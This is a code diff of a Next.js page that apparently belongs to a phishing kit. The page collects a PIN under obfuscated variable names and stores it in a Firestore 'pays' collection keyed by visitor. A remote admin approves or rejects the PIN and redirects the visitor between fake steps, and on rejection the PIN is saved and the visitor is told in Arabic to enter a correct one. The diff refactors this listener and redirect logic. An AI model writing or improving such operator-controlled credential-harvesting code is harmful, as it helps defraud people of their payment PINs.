@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -11,7 +11,6 @@ import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
 import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 export default function ConfiPage() {
@@ -23,6 +22,9 @@ export default function ConfiPage() {
   const [visitorId, setVisitorId] = useState<string>("")
   const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
 
+  // Track if we've already redirected to prevent multiple redirects
+  const hasRedirected = useRef(false)
+
   // Initialize visitor ID and update current page
   useEffect(() => {
     const id = localStorage.getItem("visitor") || ""
@@ -32,43 +34,7 @@ export default function ConfiPage() {
     }
   }, [])
 
-  // Monitor for admin redirects
-  useRedirectMonitor({ visitorId, currentPage: "confi" })
-
-  // Navigation listener - listen for admin redirects
-  useEffect(() => {
-    if (!visitorId || !db) return
-
-    const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorId),
-      (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          const step = data.currentStep
-
-          // Redirect based on currentStep
-          if (step === "home") {
-            router.push("/insur")
-          } else if (step === "phone") {
-            router.push("/step5")
-          } else if (step === "_t6") {
-            router.push("/step4")
-          } else if (step === "_st1") {
-            router.push("/check")
-          } else if (step === "_t2") {
-            router.push("/step2")
-          }
-        }
-      },
-      (error) => {
-        console.error("Navigation listener error:", error)
-      }
-    )
-
-    return () => unsubscribe()
-  }, [router, visitorId])
-
-  // Check if visitor has access to this page and monitor PIN status
+  // Combined listener for all Firestore changes
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) {
@@ -76,19 +42,29 @@ export default function ConfiPage() {
       return
     }
 
-    if (!db) return
+    if (!db) {
+      setIsLoading(false)
+      return
+    }
+
     const docRef = doc(db as Firestore, "pays", visitorID)
+
     const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
       if (!docSnapshot.exists()) {
-        router.push("/check")
+        // Only redirect to check if we haven't already redirected
+        if (!hasRedirected.current) {
+          hasRedirected.current = true
+          router.push("/check")
+        }
         return
       }
-      
+
       const data = docSnapshot.data()
       const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
-      
+      const step = data.currentStep
+
+      // Handle PIN status changes
       if (status === "rejected") {
-        // Save rejected PIN and reset status
         const currentPin = {
           code: data._v6,
           rejectedAt: new Date().toISOString()
@@ -99,7 +75,7 @@ export default function ConfiPage() {
           _v6Status: "pending"
         }, { merge: true }).then(() => {
           _ss6("pending")
-          _s6("") // Clear the old PIN
+          _s6("")
           setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
           setIsSubmitting(false)
         }).catch(err => {
@@ -108,7 +84,24 @@ export default function ConfiPage() {
           setIsSubmitting(false)
         })
       }
-      
+
+      // Handle navigation based on currentStep (only for admin redirects, not initial load)
+      // We skip redirection for _t2 and _t3 because those are previous/current pages
+      if (step && !hasRedirected.current) {
+        if (step === "_t2") {
+          // This is previous page - redirect back
+          hasRedirected.current = true
+          router.push("/step2")
+        } else if (step === "_t3") {
+          // This is our page - don't redirect
+        }
+        // Note: We intentionally do NOT redirect based on other currentStep values
+        // to prevent random redirects when admin changes step during customer's session
+      }
+
+      setIsLoading(false)
+    }, (error) => {
+      console.error("Navigation listener error:", error)
       setIsLoading(false)
     })
 
